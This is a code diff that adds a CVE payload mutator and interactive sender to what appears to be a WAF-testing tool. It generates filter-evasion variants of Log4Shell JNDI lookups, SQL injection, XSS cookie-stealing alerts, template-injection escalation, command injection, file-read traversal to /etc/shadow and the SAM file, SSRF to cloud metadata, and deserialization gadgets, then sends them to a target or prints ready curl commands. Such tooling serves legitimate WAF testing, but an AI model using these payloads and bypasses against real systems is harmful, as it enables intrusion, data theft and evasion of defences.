@@ -566,6 +566,679 @@ def generate_payloads_batch(
     return results
 
 
+# ── CVE Payload Mutator ──────────────────────────────────────────────────────
+# Generates context-aware variations of PoC payloads for WAF bypass testing.
+
+def _mutate_path(path: str) -> List[str]:
+    """Generate path encoding variations."""
+    import urllib.parse
+    variants = []
+    # Double URL encode
+    variants.append(urllib.parse.quote(path, safe='/'))
+    variants.append(urllib.parse.quote(urllib.parse.quote(path, safe=''), safe=''))
+    # Unicode normalization bypass (e.g. %c0%af for /)
+    variants.append(path.replace("/", "/%2e/"))
+    variants.append(path.replace("/", "/./"))
+    variants.append(path.replace("/", "\\"))
+    # Case variation
+    if any(c.isalpha() for c in path):
+        variants.append(path.swapcase())
+    # Path traversal injection
+    if "/" in path and not path.endswith("/"):
+        variants.append(path + "/")
+        variants.append(path + ";")
+        variants.append(path + "%00")
+    # Null byte
+    variants.append(path.replace(".", "%00."))
+    return [v for v in variants if v != path and v.strip()]
+
+
+def _mutate_params(query: str) -> List[str]:
+    """Generate query parameter variations."""
+    import urllib.parse
+    variants = []
+    if not query:
+        return variants
+    # URL encode values
+    variants.append(urllib.parse.quote(query, safe='=&'))
+    # Double encode
+    variants.append(urllib.parse.quote(urllib.parse.quote(query, safe=''), safe=''))
+    # Add HPP (HTTP Parameter Pollution) — duplicate params
+    if "=" in query:
+        parts = query.split("&")
+        if parts:
+            variants.append(query + "&" + parts[0])
+    # Unicode fullwidth
+    fw_map = {'+': '\uff0b', '=': '\uff1d', '&': '\uff06', '%': '\uff05'}
+    fw = query
+    for orig, repl in fw_map.items():
+        fw = fw.replace(orig, repl)
+    if fw != query:
+        variants.append(fw)
+    return [v for v in variants if v != query and v.strip()]
+
+
+def _mutate_headers(headers: Dict[str, str]) -> List[Dict[str, str]]:
+    """Generate header variations for WAF bypass."""
+    variants = []
+    if not headers:
+        return variants
+    # Add common WAF bypass headers
+    bypass_hdrs = dict(headers)
+    bypass_hdrs["X-Originating-IP"] = "127.0.0.1"
+    variants.append(bypass_hdrs)
+
+    bypass_hdrs2 = dict(headers)
+    bypass_hdrs2["X-Forwarded-For"] = "127.0.0.1"
+    bypass_hdrs2["X-Real-Ip"] = "127.0.0.1"
+    variants.append(bypass_hdrs2)
+
+    # Content-Type variation (if present)
+    if "Content-Type" in headers:
+        ct_var = dict(headers)
+        ct = headers["Content-Type"]
+        if "application/x-www-form-urlencoded" in ct:
+            ct_var["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundary"
+        elif "application/json" in ct:
+            ct_var["Content-Type"] = "application/json; charset=utf-8"
+        variants.append(ct_var)
+
+    # Transfer-Encoding smuggle hint
+    te_var = dict(headers)
+    te_var["Transfer-Encoding"] = "chunked"
+    variants.append(te_var)
+
+    return variants
+
+
+def _mutate_body(body: str, vuln_type: str = "") -> List[str]:
+    """Generate body payload variations."""
+    import urllib.parse
+    variants = []
+    if not body:
+        return variants
+    # URL encode
+    variants.append(urllib.parse.quote(body))
+    # Whitespace obfuscation (add tabs/spaces)
+    variants.append(body.replace(" ", "\t"))
+    # Case variation for PHP/command payloads
+    if "<?php" in body.lower():
+        variants.append(body.replace("<?php", "<?PHP"))
+        variants.append(body.replace("<?php", "<?\n php"))
+        variants.append(body.replace("phpinfo()", "PhPiNfO()"))
+        variants.append(body.replace("phpinfo()", "system('id')"))
+        variants.append(body.replace("phpinfo()", "passthru('whoami')"))
+    # Command substitution variations
+    if "id" in body:
+        variants.append(body.replace("id", "whoami"))
+    if "whoami" in body:
+        variants.append(body.replace("whoami", "cat /etc/passwd"))
+    # JNDI variations
+    if "${jndi:" in body:
+        variants.append(body.replace("${jndi:", "${${lower:j}ndi:"))
+        variants.append(body.replace("ldap://", "rmi://"))
+        variants.append(body.replace("ldap://", "dns://"))
+    # SQLi variations
+    if "UNION" in body.upper():
+        variants.append(body.replace("UNION", "/*!UNION*/"))
+        variants.append(body.replace("SELECT", "SeLeCt"))
+
+    # Vuln-type-aware body mutations
+    variants.extend(_mutate_payload_by_vuln_type(body, vuln_type))
+
+    return [v for v in variants if v != body and v.strip()]
+
+
+def _mutate_payload_by_vuln_type(payload: str, vuln_type: str) -> List[str]:
+    """Generate vuln-class-specific mutations — how real attackers tweak payloads.
+
+    Each vuln type has its own set of evasion/variation patterns that bad actors
+    commonly use to bypass WAFs and detection.
+    """
+    import urllib.parse
+    variants = []
+    vt = (vuln_type or "").lower()
+    p = payload
+
+    # ── Log4Shell / JNDI (CVE-2021-44228 and variants) ─────────────────
+    if "jndi" in p.lower() or vt == "rce" and "${" in p:
+        # Nested lookup obfuscation — 12+ known bypass patterns
+        variants.append(p.replace("${jndi:", "${${lower:j}ndi:"))
+        variants.append(p.replace("${jndi:", "${${lower:j}${lower:n}${lower:d}${lower:i}:"))
+        variants.append(p.replace("${jndi:", "${${upper:j}ndi:"))
+        variants.append(p.replace("${jndi:", "${j${::-n}di:"))
+        variants.append(p.replace("${jndi:", "${${env:NaN:-j}ndi:"))
+        variants.append(p.replace("${jndi:", "${jn${::-d}i:"))
+        variants.append(p.replace("${jndi:", "${jndi${::-:}"))
+        # Protocol swap
+        variants.append(p.replace("ldap://", "ldaps://"))
+        variants.append(p.replace("ldap://", "rmi://"))
+        variants.append(p.replace("ldap://", "dns://"))
+        variants.append(p.replace("ldap://", "iiop://"))
+        variants.append(p.replace("ldap://", "corba://"))
+        # Header injection targets
+        if "User-Agent" not in p and "X-Forwarded-For" not in p:
+            variants.append(p)  # same payload, different injection point hint
+
+    # ── SQL Injection ───────────────────────────────────────────────────
+    if vt in ("sqli", "sql_injection") or any(kw in p.upper() for kw in ("UNION", "SELECT", "OR 1=1", "' OR", "1=1")):
+        # Inline comment obfuscation
+        for kw in ("UNION", "SELECT", "FROM", "WHERE", "AND", "OR"):
+            if kw in p.upper():
+                variants.append(p.replace(kw, f"/*!{kw}*/"))
+                variants.append(p.replace(kw, f"/**/{''.join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(kw))}/**/"))
+        # Case alternation
+        variants.append("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)))
+        # Whitespace substitution
+        variants.append(p.replace(" ", "/**/"))
+        variants.append(p.replace(" ", "%09"))
+        variants.append(p.replace(" ", "%0a"))
+        variants.append(p.replace(" ", "+"))
+        # Quote alternation
+        variants.append(p.replace("'", "\""))
+        variants.append(p.replace("'", "%27"))
+        variants.append(p.replace("'", "\\'"))
+        # Numeric true variations
+        variants.append(p.replace("1=1", "2=2"))
+        variants.append(p.replace("1=1", "1<2"))
+        variants.append(p.replace("OR 1=1", "OR 'a'='a'"))
+        # Stacked query
+        if ";" not in p:
+            variants.append(p + ";--")
+            variants.append(p + ";SELECT SLEEP(5)--")
+
+    # ── XSS ─────────────────────────────────────────────────────────────
+    if vt == "xss" or "<script" in p.lower() or "onerror" in p.lower() or "alert(" in p.lower():
+        # Tag substitution
+        variants.append(p.replace("<script>", "<ScRiPt>"))
+        variants.append(p.replace("<script>", "<svg/onload="))
+        variants.append(p.replace("<script>", "<img src=x onerror="))
+        variants.append(p.replace("<script>", "<details open ontoggle="))
+        variants.append(p.replace("<script>", "<body onload="))
+        # Alert alternatives
+        variants.append(p.replace("alert(1)", "confirm(1)"))
+        variants.append(p.replace("alert(1)", "prompt(1)"))
+        variants.append(p.replace("alert(1)", "alert`1`"))
+        variants.append(p.replace("alert(1)", "alert(document.cookie)"))
+        variants.append(p.replace("alert(1)", "alert(document.domain)"))
+        # Encoding
+        variants.append(p.replace("<", "\\x3c").replace(">", "\\x3e"))
+        variants.append(p.replace("<", "\\u003c").replace(">", "\\u003e"))
+        # Event handler swap
+        variants.append(p.replace("onerror=", "onload="))
+        variants.append(p.replace("onerror=", "onfocus="))
+        variants.append(p.replace("onerror=", "onmouseover="))
+        # Protocol handler
+        if "javascript:" not in p:
+            variants.append(f"javascript:{p}")
+
+    # ── SSTI (Server-Side Template Injection) ───────────────────────────
+    if vt == "ssti" or "{{" in p or "${" in p and "jndi" not in p.lower():
+        # Jinja2 / Twig variations
+        variants.append(p.replace("{{", "{%").replace("}}", "%}"))
+        variants.append(p.replace("{{7*7}}", "{{7*'7'}}"))
+        variants.append(p.replace("{{", "${{").replace("}}", "}}"))
+        # Payload escalation
+        if "7*7" in p:
+            variants.append(p.replace("7*7", "config"))
+            variants.append(p.replace("7*7", "self.__class__.__mro__"))
+            variants.append(p.replace("7*7", "request.application.__globals__"))
+            variants.append(p.replace("{{7*7}}", "{{''.__class__.__mro__[1].__subclasses__()}}"))
+        # Freemarker
+        variants.append(p.replace("{{", "${").replace("}}", "}"))
+        # EL injection
+        variants.append(p.replace("{{", "${").replace("}}", "}"))
+        if "${" in p:
+            variants.append(p.replace("${", "#{"))
+
+    # ── Command Injection / RCE ─────────────────────────────────────────
+    if vt in ("rce", "command_injection") or any(s in p for s in ("; ", "| ", "$(", "`")):
+        # Separator variations
+        variants.append(p.replace(";", "%0a"))
+        variants.append(p.replace(";", "\n"))
+        variants.append(p.replace(";", "&&"))
+        variants.append(p.replace("|", "||"))
+        variants.append(p.replace("|", "%7c"))
+        # Command alternatives
+        cmd_swaps = {
+            "id": ["whoami", "uname -a", "cat /etc/hostname"],
+            "whoami": ["id", "echo $USER", "printenv USER"],
+            "cat /etc/passwd": ["head -1 /etc/passwd", "tail -1 /etc/passwd", "sort /etc/passwd"],
+            "ls": ["dir", "find . -maxdepth 1", "echo *"],
+            "wget": ["curl", "fetch", "lwp-download"],
+            "curl": ["wget", "python -c 'import urllib'", "nc"],
+        }
+        for orig, alts in cmd_swaps.items():
+            if orig in p:
+                for alt in alts:
+                    variants.append(p.replace(orig, alt))
+        # IFS bypass (space filtering)
+        variants.append(p.replace(" ", "${IFS}"))
+        variants.append(p.replace(" ", "$IFS$9"))
+        variants.append(p.replace(" ", "{,}"))
+        # Char-by-char construction
+        if "cat" in p:
+            variants.append(p.replace("cat", "c''a''t"))
+            variants.append(p.replace("cat", "c\\at"))
+            variants.append(p.replace("cat", "/bin/cat"))
+
+    # ── Path Traversal / LFI ────────────────────────────────────────────
+    if vt in ("lfi", "path_traversal") or "../" in p:
+        # Depth variations
+        variants.append(p.replace("../", "..../"))
+        variants.append(p.replace("../", "....//"))
+        variants.append(p.replace("../", "..%2f"))
+        variants.append(p.replace("../", "%2e%2e/"))
+        variants.append(p.replace("../", "%2e%2e%2f"))
+        variants.append(p.replace("../", "..%252f"))
+        variants.append(p.replace("../", "..\\"))
+        # Deeper traversal
+        if p.count("../") < 10:
+            variants.append(p.replace("../", "../../"))
+        # Null byte (pre-5.3 PHP)
+        if ".php" not in p and "%00" not in p:
+            variants.append(p + "%00")
+            variants.append(p + "%00.html")
+        # Target file alternatives
+        file_swaps = {
+            "/etc/passwd": ["/etc/shadow", "/etc/hosts", "/proc/self/environ", "/proc/version"],
+            "etc/passwd": ["etc/shadow", "etc/hosts", "proc/self/environ", "proc/version"],
+            "win.ini": ["boot.ini", "windows/system32/config/sam"],
+        }
+        for orig, alts in file_swaps.items():
+            if orig in p:
+                for alt in alts:
+                    variants.append(p.replace(orig, alt))
+        # PHP filter wrapper
+        if "php" in p.lower() and "php://" not in p:
+            variants.append(p.replace("../", "") + "&file=php://filter/convert.base64-encode/resource=index")
+
+    # ── SSRF ────────────────────────────────────────────────────────────
+    if vt == "ssrf" or "127.0.0.1" in p or "localhost" in p:
+        # IP representation alternatives
+        variants.append(p.replace("127.0.0.1", "0x7f000001"))
+        variants.append(p.replace("127.0.0.1", "2130706433"))
+        variants.append(p.replace("127.0.0.1", "0177.0.0.1"))
+        variants.append(p.replace("127.0.0.1", "0"))
+        variants.append(p.replace("127.0.0.1", "[::1]"))
+        variants.append(p.replace("127.0.0.1", "localhost"))
+        variants.append(p.replace("localhost", "127.0.0.1"))
+        # Protocol alternatives
+        variants.append(p.replace("http://", "gopher://"))
+        variants.append(p.replace("http://", "dict://"))
+        variants.append(p.replace("http://", "file:///"))
+        # Cloud metadata endpoints
+        if "169.254.169.254" not in p:
+            variants.append(p.replace("127.0.0.1", "169.254.169.254"))
+        # DNS rebinding hint
+        variants.append(p.replace("127.0.0.1", "spoofed.burpcollaborator.net"))
+
+    # ── Deserialization ─────────────────────────────────────────────────
+    if vt == "deserialization" or "ysoserial" in p.lower() or "ObjectInputStream" in p:
+        # Gadget chain variations
+        gadget_swaps = {
+            "CommonsCollections1": ["CommonsCollections5", "CommonsCollections6", "CommonsCollections7"],
+            "Groovy1": ["Spring1", "Spring2"],
+            "CommonsBeanutils1": ["CommonsBeanutils2"],
+        }
+        for orig, alts in gadget_swaps.items():
+            if orig in p:
+                for alt in alts:
+                    variants.append(p.replace(orig, alt))
+        # Command in gadget
+        if "calc" in p:
+            variants.append(p.replace("calc", "id"))
+            variants.append(p.replace("calc", "whoami"))
+
+    # ── Auth Bypass ─────────────────────────────────────────────────────
+    if vt == "auth_bypass":
+        variants.append(p.replace("admin", "Admin"))
+        variants.append(p.replace("admin", "ADMIN"))
+        variants.append(p.replace("admin", "admin' --"))
+        variants.append(p.replace("admin", "admin'/*"))
+        if "true" in p.lower():
+            variants.append(p.replace("true", "True"))
+            variants.append(p.replace("true", "1"))
+
+    return [v for v in variants if v != p and v.strip()]
+
+
+def mutate_cve_payload(
+    payload: Dict[str, Any],
+    max_variants: int = 12,
+) -> List[Dict[str, Any]]:
+    """Generate context-aware variants of a CVE payload.
+
+    Takes a payload dict (from generate_payloads_from_cve) and generates
+    encoding/obfuscation/parameter variants that a real attacker might use.
+
+    Args:
+        payload: Payload dict with keys: payload, method, path, headers, body, vuln_type
+        max_variants: Max number of variants to generate.
+
+    Returns:
+        List of variant dicts, each with 'payload', 'mutation', 'original'.
+    """
+    variants: List[Dict[str, Any]] = []
+    seen = {payload.get("payload", "")}
+    original = payload.get("payload", "")
+    method = payload.get("method", "GET")
+    path = payload.get("path", "")
+    headers = payload.get("headers", {})
+    body = payload.get("body", "")
+    vuln_type = payload.get("vuln_type", "")
+
+    # 1. Path mutations (for PoC payloads with paths)
+    if path and "?" in path:
+        base, query = path.split("?", 1)
+        # Mutate the query string
+        for mq in _mutate_params(query)[:3]:
+            variant_path = f"{base}?{mq}"
+            if variant_path not in seen:
+                seen.add(variant_path)
+                v = dict(payload)
+                v["payload"] = variant_path
+                v["path"] = variant_path
+                v["mutation"] = "param_encoding"
+                v["original"] = original
+                variants.append(v)
+
+        # Mutate the base path
+        for mp in _mutate_path(base)[:2]:
+            variant_path = f"{mp}?{query}"
+            if variant_path not in seen:
+                seen.add(variant_path)
+                v = dict(payload)
+                v["payload"] = variant_path
+                v["path"] = variant_path
+                v["mutation"] = "path_encoding"
+                v["original"] = original
+                variants.append(v)
+    elif path:
+        for mp in _mutate_path(path)[:3]:
+            if mp not in seen:
+                seen.add(mp)
+                v = dict(payload)
+                v["payload"] = mp
+                v["path"] = mp
+                v["mutation"] = "path_encoding"
+                v["original"] = original
+                variants.append(v)
+
+    # 2. Header mutations
+    if headers:
+        for mh in _mutate_headers(headers)[:2]:
+            v = dict(payload)
+            v["headers"] = mh
+            v["mutation"] = "header_bypass"
+            v["original"] = original
+            # Mark as unique by header combo
+            hkey = str(sorted(mh.items()))
+            if hkey not in seen:
+                seen.add(hkey)
+                variants.append(v)
+
+    # 3. Body mutations
+    if body:
+        for mb in _mutate_body(body, vuln_type)[:3]:
+            if mb not in seen:
+                seen.add(mb)
+                v = dict(payload)
+                v["body"] = mb
+                v["mutation"] = "body_obfuscation"
+                v["original"] = original
+                variants.append(v)
+
+    # 4. Vuln-type-aware payload mutations (highest priority for context)
+    if original and vuln_type:
+        for mp in _mutate_payload_by_vuln_type(original, vuln_type)[:6]:
+            if mp not in seen:
+                seen.add(mp)
+                v = dict(payload)
+                v["payload"] = mp
+                v["mutation"] = f"vuln_{vuln_type}"
+                v["original"] = original
+                variants.append(v)
+
+    # 5. Generic payload mutations (fill remaining slots with encoding variants)
+    if not path and not body and original:
+        try:
+            from fray.mutator import mutate_payload as _generic_mutate
+            remaining = max(0, max_variants - len(variants) - 1)
+            generic = _generic_mutate(original, max_variants=remaining)
+            for g in generic:
+                gp = g["payload"]
+                if gp not in seen:
+                    seen.add(gp)
+                    v = dict(payload)
+                    v["payload"] = gp
+                    v["mutation"] = g["strategy"]
+                    v["original"] = original
+                    variants.append(v)
+        except ImportError:
+            pass
+
+    # 6. Method swap (GET↔POST)
+    if method in ("GET", "POST") and (path or body):
+        v = dict(payload)
+        v["method"] = "POST" if method == "GET" else "GET"
+        v["mutation"] = "method_swap"
+        v["original"] = original
+        variants.append(v)
+
+    return variants[:max_variants]
+
+
+def interactive_cve_payloads(result: Dict[str, Any], target: str = ""):
+    """Interactive mode: show payloads + variants, let user select which to send.
+
+    Args:
+        result: Output from generate_payloads_from_cve().
+        target: Optional URL to test payloads against.
+    """
+    B = "\033[1m"
+    D = "\033[2m"
+    R = "\033[0m"
+    RED = "\033[91m"
+    YEL = "\033[93m"
+    GRN = "\033[92m"
+    CYN = "\033[96m"
+
+    payloads = result.get("payloads", [])
+    if not payloads:
+        print(f"  {YEL}No payloads to work with.{R}")
+        return
+
+    # Print header
+    cve_id = result.get("cve_id", "")
+    print(f"\n{D}{'━' * 64}{R}")
+    print(f"  {B}CVE Payload Lab{R}  {CYN}{cve_id}{R}")
+    print(f"  {D}Select a payload → see variants → send{R}")
+    print(f"{D}{'━' * 64}{R}\n")
+
+    while True:
+        # List payloads
+        print(f"  {B}Payloads:{R}")
+        for i, p in enumerate(payloads, 1):
+            src = p.get("source", "template")
+            tag = f"{GRN}PoC{R}" if src == "poc" else f"{D}tmpl{R}"
+            method = p.get("method", "")
+            path = p.get("path", "")
+            if method and path and src == "poc":
+                print(f"    {CYN}{i:2d}{R}. [{tag}] {method} {path[:50]}")
+            else:
+                print(f"    {CYN}{i:2d}{R}. [{tag}] {p['payload'][:55]}")
+
+        print(f"\n  {D}Enter number to expand, 'a' to send all, 'q' to quit{R}")
+
+        try:
+            choice = input(f"  {B}>{R} ").strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            break
+
+        if choice in ("q", "quit", "exit"):
+            break
+
+        if choice in ("a", "all"):
+            if not target:
+                print(f"  {YEL}No --test-target specified. Use -T <url> to test.{R}")
+                continue
+            _send_payloads(payloads, target)
+            continue
+
+        try:
+            idx = int(choice) - 1
+            if idx < 0 or idx >= len(payloads):
+                print(f"  {YEL}Invalid number{R}")
+                continue
+        except ValueError:
+            print(f"  {YEL}Enter a number, 'a', or 'q'{R}")
+            continue
+
+        selected = payloads[idx]
+
+        # Show details
+        print(f"\n  {D}{'─' * 60}{R}")
+        print(f"  {B}Original Payload:{R}")
+        src = selected.get("source", "template")
+        tag = f"{GRN}[PoC]{R}" if src == "poc" else f"{D}[tmpl]{R}"
+        method = selected.get("method", "GET")
+        path = selected.get("path", "")
+        print(f"    {tag} {method} {selected['payload'][:70]}")
+        if selected.get("headers"):
+            for k, v in list(selected["headers"].items())[:3]:
+                print(f"    {D}  {k}: {v[:40]}{R}")
+        if selected.get("body"):
+            print(f"    {D}  body: {selected['body'][:60]}{R}")
+
+        # Generate variants
+        variants = mutate_cve_payload(selected, max_variants=8)
+
+        if variants:
+            print(f"\n  {B}Variants ({len(variants)}):{R}")
+            for j, v in enumerate(variants, 1):
+                mutation = v.get("mutation", "?")
+                vm = v.get("method", method)
+                vpath = v.get("path", "")
+                vpayload = v.get("payload", "")[:55]
+                if vpath and vm:
+                    print(f"    {YEL}{j:2d}{R}. [{mutation:18s}] {vm} {vpath[:50]}")
+                else:
+                    print(f"    {YEL}{j:2d}{R}. [{mutation:18s}] {vpayload}")
+                if v.get("body") and v["body"] != selected.get("body", ""):
+                    print(f"        {D}body: {v['body'][:55]}{R}")
+                if v.get("headers") and v["headers"] != selected.get("headers", {}):
+                    diff_keys = [k for k in v["headers"] if k not in selected.get("headers", {})]
+                    if diff_keys:
+                        print(f"        {D}+headers: {', '.join(diff_keys)}{R}")
+        else:
+            print(f"\n  {D}No variants generated for this payload{R}")
+
+        # Sub-menu
+        all_options = [selected] + variants
+        print(f"\n  {D}Enter variant # to send, 'o' for original, 's' for all similar, 'b' to go back{R}")
+        try:
+            sub = input(f"  {B}>{R} ").strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            break
+
+        if sub == "b":
+            continue
+        elif sub == "o":
+            if target:
+                _send_payloads([selected], target)
+            else:
+                _print_sendable([selected])
+        elif sub == "s":
+            if target:
+                _send_payloads(all_options, target)
+            else:
+                _print_sendable(all_options)
+        else:
+            try:
+                vidx = int(sub) - 1
+                if 0 <= vidx < len(variants):
+                    if target:
+                        _send_payloads([variants[vidx]], target)
+                    else:
+                        _print_sendable([variants[vidx]])
+                else:
+                    print(f"  {YEL}Invalid variant number{R}")
+            except ValueError:
+                pass
+
+
+def _send_payloads(payloads: List[Dict[str, Any]], target: str):
+    """Send payloads to target and show results."""
+    B = "\033[1m"
+    D = "\033[2m"
+    R = "\033[0m"
+    RED = "\033[91m"
+    GRN = "\033[92m"
+
+    try:
+        from fray.tester import WAFTester
+    except ImportError:
+        print(f"  {RED}fray.tester not available{R}")
+        return
+
+    tester = WAFTester(target, timeout=8, delay=0.3)
+    tested = blocked = 0
+
+    print(f"\n  {B}Sending {len(payloads)} payload(s) → {target}{R}")
+    for p in payloads:
+        payload_str = p.get("payload", "")
+        mutation = p.get("mutation", "original")
+        try:
+            r = tester.test_payload(payload_str)
+            tested += 1
+            status = r.get("status_code", "?")
+            is_blocked = r.get("blocked", False)
+            if is_blocked:
+                blocked += 1
+                print(f"    {RED}✗ BLOCKED{R}  [{mutation:18s}]  HTTP {status}  {payload_str[:40]}")
+            else:
+                print(f"    {GRN}✓ PASSED{R}   [{mutation:18s}]  HTTP {status}  {payload_str[:40]}")
+        except Exception as e:
+            print(f"    {D}? ERROR    [{mutation:18s}]  {str(e)[:40]}{R}")
+
+    bypassed = tested - blocked
+    print(f"\n  {B}Results:{R} {tested} tested, {GRN}{bypassed} bypassed{R}, {RED}{blocked} blocked{R}")
+
+
+def _print_sendable(payloads: List[Dict[str, Any]]):
+    """Print payloads in copy-pastable format (no target specified)."""
+    B = "\033[1m"
+    D = "\033[2m"
+    R = "\033[0m"
+    CYN = "\033[96m"
+
+    print(f"\n  {B}Copy-pastable payloads:{R}")
+    for p in payloads:
+        method = p.get("method", "GET")
+        path = p.get("path", "")
+        payload_str = p.get("payload", "")
+        headers = p.get("headers", {})
+        body = p.get("body", "")
+        mutation = p.get("mutation", "original")
+
+        if path and method:
+            # Print as curl command
+            cmd = f"curl -X {method} 'TARGET{path}'"
+            for k, v in headers.items():
+                cmd += f" -H '{k}: {v}'"
+            if body:
+                cmd += f" -d '{body}'"
+            print(f"    {D}# {mutation}{R}")
+            print(f"    {CYN}{cmd}{R}")
+        else:
+            print(f"    {D}# {mutation}{R}")
+            print(f"    {CYN}{payload_str}{R}")
+    print(f"\n  {D}Replace TARGET with your target URL{R}")
+
+
 # ── CLI-friendly output ──────────────────────────────────────────────────────
 
 def print_cve_payloads(result: Dict[str, Any]):
